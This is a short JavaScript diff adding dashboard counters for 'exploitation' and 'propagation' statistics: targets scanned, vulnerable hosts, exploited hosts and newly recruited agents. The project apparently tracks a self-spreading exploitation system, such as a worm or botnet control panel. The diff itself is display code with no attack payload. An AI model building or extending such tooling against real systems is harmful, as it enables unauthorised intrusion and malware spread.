@@ -629,6 +629,28 @@ async function loadAll() {
     log('error', `Agents load failed: ${e.message}`, 'api');
     agents = [];
   }
+  
+  // Load exploitation stats
+  try {
+    const exploitStats = await fetch(`${API}/api/exploitation/stats`).then(r => r.json());
+    document.getElementById('exploit-scanned').textContent = exploitStats.targets_scanned || 0;
+    document.getElementById('exploit-vulnerable').textContent = exploitStats.vulnerable_found || 0;
+    document.getElementById('exploited-count').textContent = exploitStats.exploited || 0;
+  } catch (e) {
+    // Exploitation stats optional
+  }
+  
+  // Load propagation stats
+  try {
+    const propStats = await fetch(`${API}/api/propagation/status`).then(r => r.json());
+    if (propStats.propagation) {
+      document.getElementById('prop-attempts').textContent = propStats.propagation.total_tasks || 0;
+      document.getElementById('prop-success').textContent = propStats.propagation.completed || 0;
+      document.getElementById('prop-new-agents').textContent = propStats.propagation.new_agents_24h || 0;
+    }
+  } catch (e) {
+    // Propagation stats optional
+  }
 }
 
 // Render Agents
